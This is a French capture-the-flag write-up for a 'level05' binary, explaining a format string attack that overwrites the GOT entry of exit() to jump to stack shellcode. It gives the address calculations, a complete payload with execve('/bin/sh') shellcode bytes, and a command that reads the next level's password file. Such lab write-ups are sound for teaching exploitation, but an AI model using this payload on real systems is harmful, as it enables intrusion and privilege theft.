On a acces a un executable qui fgets 100 octets sur l'entree standard dans un
buffer stack, puis qui les interprete comme une chaine de caracteres pour passer
toutes les majuscules en minuscules. L'executable passe ensuite le buffer a un
printf, avant d'appeler exit().

Notre attaque seras donc une format string attack pour changer l'entree GOT de
exit(), vers un shellcode. Pour eviter que l'instruction 'push eax' de notre
shellcode, qui termine la chaine de caractere "//bin/sh" dans la stack, et dont
l'opcode est 0x50, ne soit transformee en 0x70 par le passage en minuscules (car
0x50 correspond a 'P'), on passe un octet 0 apres notre chaine d'attaque de
format, juste avant le shellcode.

Avec un objdump -R, on trouve l'addresse de l'entree GOT de exit: 0x080497e0

On va la passer 2 fois dans le buffer, pour ecrire les octets 2 par 2, car les
addresses stack commencent par 0xffff.... et ecrire en 1 fois prendrait 4
milliards de caracteres (litteralement).

Pour trouver l'addresse de notre shellcode en memoire, on va deja devoir
trouver la difference entre les addresses gdb et celles de l'execution. On passe
des %p au printf pour lui faire afficher la memoire, et on cherche des addresses
stack a comparer entre gdb et l'execution normale.

$ echo "%p %p %p %p %p %p %p %p %p %p" > /tmp/in
$ cat /tmp/in | ./level05
$ gdb level05
(gdb) r < /tmp/in

En comparant les addresses on trouve que la difference entre les addresses gdb
et exec normale est de 32 octets de plus pour l'execution normale. On trouve
l'addresse du buffer dans gdb: 0xffffd698
On ajoute 0x20 pour obtenir l'addresse du buffer en execution normale: 0xffffd6b8

On trouve avec des %p que l'argument positionnel printf pour tomber dans le
buffer est de 10 (et 11 pour tomber 4 octets dans le buffer).
Notre chaine de format string attack seras donc:
[addresse GOT][addresse GOT + 4][nombre des 2 1ers octets addr shellcode]%10$n↙
[nombre des 2 derniers octets addr shellcode - octets deja affiches]%11$n

-les addresses font 4 octets chacunes (8 octets),
-le padding se fait avec "%12345x" les 2 fois, soit 2*7 octets (14 octets)
-les %n sont "%10$n" et "%11$n" soit 2*5 octets (10 octets)
-l'octet nul pour separer le shellcode de la chaine d'attaque ajoute 1 octet

Notre chaine d'attaque fait donc au total 33 octets. On ajoute 33 a l'addresse
du buffer en execution normale pour obtenir l'addresse de notre shellcode en
memoire: 0xffffd6d9

On peux maintenant trouver le nombre d'octets a mettre dans le padding pour
ecrire en memoire precisement 0xffffd6d9:
-1ere moitie: On enleve 8 pour les 8 octets des 2 addresses
0xd6d9 - 0x8 = 54993 en decimal
-2eme moitie: On enleve le nombre d'octets deja affiches (0xd6d9)
0xffff - 0xd6d9 = 10534 en decimal

Notre chaine d'attaque complete seras donc:
[chaine pour la GOT override (ligne 37-38)][octet 0][shellcode][padding pour satisfaire le fgets]

$ [copie colle du contenu de fill_script_command]
$ echo -en "\xe0\x97\x04\x08\xe2\x97\x04\x08%54993x%10\$n%10534x%11\$n\x00\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"$(/tmp/fill 50) > /tmp/in
$ (cat /tmp/in; echo "cat /home/users/level06/.pass") | ./level05
